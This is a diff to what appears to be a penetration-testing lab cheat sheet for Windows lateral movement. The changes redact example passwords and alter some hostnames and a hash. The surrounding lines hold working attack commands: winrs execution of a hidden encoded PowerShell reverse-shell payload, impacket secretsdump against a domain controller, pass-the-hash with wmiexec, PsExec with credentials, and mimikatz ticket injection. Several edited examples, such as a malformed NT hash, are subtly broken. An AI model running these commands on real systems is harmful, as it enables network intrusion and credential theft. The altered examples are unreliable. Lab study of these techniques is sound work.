@@ -11,7 +11,7 @@
 
 # Step 1 — Set credentials
 $username = 'corp\jen';
-$password = 'Nexus123!';
+$password = '!';
 $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
 $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
 
@@ -47,7 +47,7 @@ Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Creat
 winrs -r:<SERVER> -u:<user> -p:<password> "cmd /c hostname & whoami"
 
 # Expected output:
-# FILES04
+# FIL04
 # corp\jen
 
 # Step 2 — Send reverse shell payload
@@ -66,7 +66,7 @@ winrs -r:<SERVER> -u:<user> -p:<password> "powershell -nop -w hidden -e <base64_
 
 # Step 1 — Set credentials
 $username = 'jen';
-$password = 'Nexus123!';
+$password = '!';
 $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
 $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
 
@@ -101,7 +101,7 @@ Enter-PSSession 1
 .\PsExec64.exe -i \\<TARGET> -u corp\<user> -p <password> cmd
 
 # Example:
-.\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
+.\PsExec64.exe -i \\FILES04 -u corp\jen -p ! cmd
 
 # Flags:
 # -i   = interactive session
@@ -155,7 +155,7 @@ impacket-secretsdump corp.com/<admin>:'<password>'@<DC-IP>
 # Hash format in output:
 # username:RID:lmhash:NThash:::
 # Example:
-impacket-secretsdump corp.com/jeffadmin:'BrouhahaTungPerorateBroom2023!'@192.168.151.70
+impacket-secretsdump corp.com/jeffadmin:'password!'@192.168.151.70
 
 # --- psexec with password ---
 impacket-psexec corp.com/<user>:'<password>'@<target-IP>
@@ -170,7 +170,7 @@ impacket-wmiexec corp.com/<user>:'<password>'@<target-IP>
 impacket-wmiexec -hashes :<NThash> corp.com/<user>@<target-IP>
 
 # Real example:
-/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+/usr/bin/impacket-wmiexec -hashes :2892D26CDF84Dasdf7A70E2EB23B9F05C425E Administrator@192.168.50.73
 
 # --- smbexec with password (no binary drop) ---
 impacket-smbexec corp.com/<user>:'<password>'@<target-IP>
@@ -209,8 +209,8 @@ mimikatz # exit
 klist
 
 # Step 5 — Access the resource using the injected ticket (no password needed!)
-ls \\web04\backup
-type \\web04\backup\flag.txt
+ls \\web0\backup
+type \\web0\backup\flag.txt
 
 # NOTES:
 # - No password or hash needed — just the .kirbi file
